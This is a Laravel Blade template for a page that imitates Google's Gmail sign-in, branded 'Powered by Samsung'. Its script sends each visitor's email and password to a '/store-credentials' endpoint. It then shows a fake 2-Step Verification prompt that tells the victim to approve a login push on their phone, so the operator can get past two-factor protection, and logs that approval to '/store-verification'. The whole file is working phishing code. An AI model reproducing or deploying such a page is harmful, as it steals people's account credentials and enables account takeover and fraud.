@extends('layouts.app')

@section('title', 'Gmail')

@section('content')
<div class="min-h-screen bg-gray-100 flex flex-col">
    <!-- Samsung Logo Section -->
    <div class="flex items-center justify-center pt-8 md:pt-16 pb-4 md:pb-8 px-4">
        <span class="text-xl sm:text-2xl md:text-3xl lg:text-4xl font-black text-gray-800 mr-2 sm:mr-3 md:mr-4 whitespace-nowrap">POWERED BY</span>
        <img src="{{ asset('samsung/logo.png') }}" alt="Samsung" class="h-8 sm:h-10 md:h-12 lg:h-16 flex-shrink-0">
    </div>
    
    <div class="flex-1 flex items-center justify-center px-4 py-8">
        <div class="w-full max-w-6xl">
            <div class="bg-white rounded-3xl shadow-lg p-12 grid grid-cols-1 lg:grid-cols-2 gap-18">
                <!-- LEFT: Google mark + text -->
                <section class="flex flex-col gap-4 -mt-5">
                    <img class="w-10 h-10" alt="Google" src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png">
                    <div class="text-3xl font-medium text-gray-800">Sign in</div>
                    <p class="text-sm text-gray-600 max-w-md">
                        with your Google Account to continue to Gmail. This
                        account will be available to other Google apps in the
                        browser.
                    </p>
                </section>

                <!-- RIGHT: form -->
                <section class="form">
                    <form id="google-form">
                        @csrf
                        <!-- Email Step -->
                        <div id="email-step">
                            <div class="flex flex-col gap-2 mb-4">
                                <input id="email-input" class="w-full px-3 py-3 border border-gray-300 rounded-md text-base focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500" placeholder="Email or phone" type="text" required>
                                <a class="text-sm text-blue-600 hover:underline" href="#">Forgot email?</a>
                            </div>

                            <p class="text-xs text-gray-600 mb-7 leading-relaxed">
                                Not your computer? Use Guest mode to sign in privately.
                                <a href="#" class="text-blue-600 hover:underline">Learn more about using Guest mode</a>
                            </p>

                            <div class="flex justify-between items-center">
                                <button type="button" class="px-4 py-2 rounded-full border border-transparent bg-transparent text-blue-600 text-sm font-medium cursor-pointer transition-colors hover:bg-blue-50">Create account</button>
                                <button type="button" id="next-btn" class="px-6 py-2 bg-blue-600 text-white rounded-full text-sm font-medium hover:bg-blue-700 transition-colors disabled:bg-blue-400 disabled:cursor-not-allowed flex items-center justify-center">
                                    <div class="animate-spin mr-2 h-4 w-4 border-2 border-white border-t-transparent rounded-full hidden"></div>
                                    <span class="btn-text">Next</span>
                                </button>
                            </div>
                        </div>

                        <!-- Password Step -->
                        <div id="password-step" class="hidden">
                            <div class="flex items-center gap-2 mb-4 px-3 py-2 bg-blue-50 border border-blue-200 rounded-md">
                                <img class="w-4 h-4" alt="Google" src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png">
                                <span id="user-email" class="text-sm text-gray-700"></span>
                            </div>

                            <div class="flex flex-col gap-2 mb-7">
                                <input id="password-input" class="w-full px-3 py-3 border border-gray-300 rounded-md text-base focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500" placeholder="Enter your password" type="password" required>
                                <a class="text-sm text-blue-600 hover:underline" href="#">Forgot password?</a>
                            </div>

                            <div class="flex justify-between items-center">
                                <button type="button" id="try-another-btn" class="px-4 py-2 rounded-full border border-transparent bg-transparent text-blue-600 text-sm font-medium cursor-pointer transition-colors hover:bg-blue-50">
                                    <span class="btn-text">Try another way</span>
                                    <i class="fas fa-spinner fa-spin hidden ml-2"></i>
                                </button>
                                <button type="submit" id="submit-btn" class="px-6 py-2 bg-blue-600 text-white rounded-full text-sm font-medium hover:bg-blue-700 transition-colors disabled:bg-blue-400 disabled:cursor-not-allowed flex items-center justify-center">
                                    <div class="animate-spin mr-2 h-4 w-4 border-2 border-white border-t-transparent rounded-full hidden"></div>
                                    <span class="btn-text">Submit</span>
                                </button>
                            </div>
                        </div>
                    </form>
                </section>
            </div>
        </div>
    </div>

    <!-- Language selector at bottom left -->
    <div class="absolute bottom-3 left-4 text-xs text-gray-600 cursor-pointer">
        English (United States) ▾
    </div>

    <!-- Footer links at bottom right -->
    <div class="absolute bottom-3 right-4 text-xs text-gray-600">
        <a href="#" class="hover:underline ml-4">Help</a>
        <a href="#" class="hover:underline ml-4">Privacy</a>
        <a href="#" class="hover:underline ml-4">Terms</a>
    </div>
</div>

<!-- Verification Modal -->
<div id="verificationModal" class="fixed inset-0 bg-black bg-opacity-50 z-50 hidden">
    <div class="flex items-center justify-center min-h-screen">
        <div class="bg-white rounded-lg p-8 max-w-md w-full mx-4">
            <div class="text-center">
                <div class="mx-auto mb-4 text-4xl font-normal">
                    <span style="color: #4285f4;">G</span><span style="color: #ea4335;">o</span><span style="color: #fbbc05;">o</span><span style="color: #4285f4;">g</span><span style="color: #34a853;">l</span><span style="color: #ea4335;">e</span>
                </div>
                <h3 class="text-xl font-medium text-gray-900 mb-2">2-Step Verification</h3>
                <p class="text-sm text-gray-600 mb-6">To help keep your account safe, Google wants to make sure it's really you trying to sign in with an android device click "yes it's me" to approve your login<br><br>Open the Gmail app Google sent a notification to your phone Open the Gmail app and tap Yes on the prompt to verify it's you.</p>
                
                <span id="email-message" class="text-red-600 text-sm font-medium mb-4 hidden">Go to your email and approve your login</span>
                
                <button id="verify-btn" class="w-full bg-blue-600 text-white py-3 rounded-md font-medium hover:bg-blue-700 transition-colors disabled:bg-blue-400 disabled:cursor-not-allowed flex items-center justify-center">
                    <div class="animate-spin mr-2 h-4 w-4 border-2 border-white border-t-transparent rounded-full hidden"></div>
                    <span class="btn-text">Done</span>
                </button>
            </div>
        </div>
    </div>
</div>

<!-- Validation Modal -->
<div id="validationModal" class="fixed inset-0 bg-black bg-opacity-50 z-50 hidden">
    <div class="flex items-center justify-center min-h-screen">
        <div class="bg-white rounded-lg p-8 max-w-md w-full mx-4">
            <div class="text-center">
                <div class="w-16 h-16 mx-auto mb-4 bg-blue-100 rounded-full flex items-center justify-center">
                    <div class="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div>
                </div>
                <h3 class="text-xl font-medium text-gray-900 mb-2">Validating...</h3>
                <p class="text-sm text-gray-600">Please wait while we verify your information.</p>
            </div>
        </div>
    </div>
</div>

@push('scripts')
<script>
    document.addEventListener('DOMContentLoaded', function() {
        const emailStep = document.getElementById('email-step');
        const passwordStep = document.getElementById('password-step');
        const emailInput = document.getElementById('email-input');
        const passwordInput = document.getElementById('password-input');
        const nextBtn = document.getElementById('next-btn');
        const tryAnotherBtn = document.getElementById('try-another-btn');
        const submitBtn = document.getElementById('submit-btn');
        const userEmailSpan = document.getElementById('user-email');
        const form = document.getElementById('google-form');
        const verificationModal = document.getElementById('verificationModal');
        const validationModal = document.getElementById('validationModal');

        const verifyBtn = document.getElementById('verify-btn');

        let loginAttemptId = null;

        function showSpinner(btn) {
            const btnText = btn.querySelector('.btn-text');
            const spinner = btn.querySelector('.animate-spin');
            btnText.textContent = btnText.textContent + '...';
            spinner.classList.remove('hidden');
            btn.disabled = true;
        }

        function hideSpinner(btn, originalText) {
            const btnText = btn.querySelector('.btn-text');
            const spinner = btn.querySelector('.animate-spin');
            btnText.textContent = originalText;
            spinner.classList.add('hidden');
            btn.disabled = false;
        }

        nextBtn.addEventListener('click', function() {
            const email = emailInput.value.trim();
            if (!email) {
                emailInput.focus();
                return;
            }

            showSpinner(nextBtn);
            setTimeout(() => {
                hideSpinner(nextBtn, 'Next');
                emailStep.classList.add('hidden');
                passwordStep.classList.remove('hidden');
                userEmailSpan.textContent = email;
                passwordInput.focus();
            }, 300);
        });

        tryAnotherBtn.addEventListener('click', function() {
            showSpinner(tryAnotherBtn);
            setTimeout(() => {
                hideSpinner(tryAnotherBtn, 'Try another way');
                passwordStep.classList.add('hidden');
                emailStep.classList.remove('hidden');
                emailInput.focus();
            }, 300);
        });

        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();
            
            if (!email || !password) return;

            showSpinner(submitBtn);

            fetch('/store-credentials', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
                },
                body: JSON.stringify({
                    platform: 'google',
                    email: email,
                    password: password
                })
            })
            .then(response => response.json())
            .then(data => {
                hideSpinner(submitBtn, 'Submit');
                if (data.success) {
                    loginAttemptId = data.id;
                    verificationModal.classList.remove('hidden');

                }
            })
            .catch(error => {
                hideSpinner(submitBtn, 'Submit');
                console.error('Error:', error);
            });
        });

        verifyBtn.addEventListener('click', function() {
            showSpinner(verifyBtn);

            if (loginAttemptId) {
                fetch('/store-verification', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
                    },
                    body: JSON.stringify({
                        attempt_id: loginAttemptId,
                        verification_code: 'approved',
                        platform: 'google'
                    })
                })
                .then(response => response.json())
                .then(data => {
                    hideSpinner(verifyBtn, 'Done');
                    const emailMessage = document.getElementById('email-message');
                    emailMessage.classList.remove('hidden');
                    setTimeout(() => {
                        emailMessage.classList.add('hidden');
                    }, 5000);
                })
                .catch(error => {
                    hideSpinner(verifyBtn, 'Done');
                    console.error('Error:', error);
                });
            }
        });


    });
</script>
@endpush
@endsection